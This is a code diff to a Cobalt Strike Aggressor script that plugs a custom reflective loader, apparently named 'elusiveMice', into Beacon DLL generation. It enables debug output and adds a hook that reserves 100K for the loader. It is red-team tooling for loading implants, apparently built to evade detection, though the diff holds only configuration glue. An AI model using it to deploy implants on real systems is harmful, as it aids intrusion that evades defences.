@@ -4,7 +4,8 @@
 # Enable Debug of PE content
 # The generated PE content will be displayed in the script console if debug is true
 
-$debug = "false";
+#$debug = "true";
+$debug = "true";
 
 
 # ===========================================================================
@@ -61,7 +62,7 @@ sub generate_my_dll {
 	# Load a object file that contains a Reflective Loader.
 	# The architecture ($3) is used in the path.
 	# ---------------------------------------------------------------------
-    $handle = openf(script_resource("/bin/ReflectiveLoader. $+ $3 $+ .o"));
+    $handle = openf(script_resource("elusiveMice. $+ $3 $+ .o"));
 	$data   = readb($handle, -1);
 	closef($handle);
 
@@ -129,7 +130,7 @@ sub generate_my_dll {
 # $3 = arch
 # ------------------------------------
 set BEACON_RDLL_GENERATE {
-	warn("========== Running 'BEACON_RDLL_GENERATE' for DLL " . $1 . " with architecture " . $3 . " ==========");
+	warn("========== Running elusiveMice 'BEACON_RDLL_GENERATE' for DLL " . $1 . " with architecture " . $3 . " ==========");
 	return generate_my_dll($1, $2, $3);
 }
 
@@ -142,6 +143,25 @@ set BEACON_RDLL_GENERATE {
 # $6 = GetProcAddress pointer
 # ------------------------------------
 set BEACON_RDLL_GENERATE_LOCAL {
-	warn("========== Running 'BEACON_RDLL_GENERATE_LOCAL' for DLL " . $1 . " with architecture " . $3 . " Beacon ID " . $4 . " GetModuleHandleA " . $5 . " GetProcAddress " . $6 . " ==========");
+	warn("========== Running elusiveMice 'BEACON_RDLL_GENERATE_LOCAL' for DLL " . $1 . " with architecture " . $3 . " Beacon ID " . $4 . " GetModuleHandleA " . $5 . " GetProcAddress " . $6 . " ==========");
 	return generate_my_dll($1, $2, $3);
+}
+
+# BEACON_RDLL_SIZE HOOK
+# Override the beacon loader to load beacons with larger space reserved for the
+# User Defined Reflective Loader function.
+#
+# Arguments
+#  $1 = dll name
+#  $2 = arch
+#
+# Returns
+#  a string representing the size to use for the Reflective Loader.
+#  valid values are: [0, 5, 100]
+set BEACON_RDLL_SIZE {
+    print_info("UDRL - BEACON_RDLL_SIZE hook");
+
+    $size = 100;
+    print_info("UDRL - Use the $size $+ K Reflective Loader (elusiveMice)");
+    return "$size";
 }
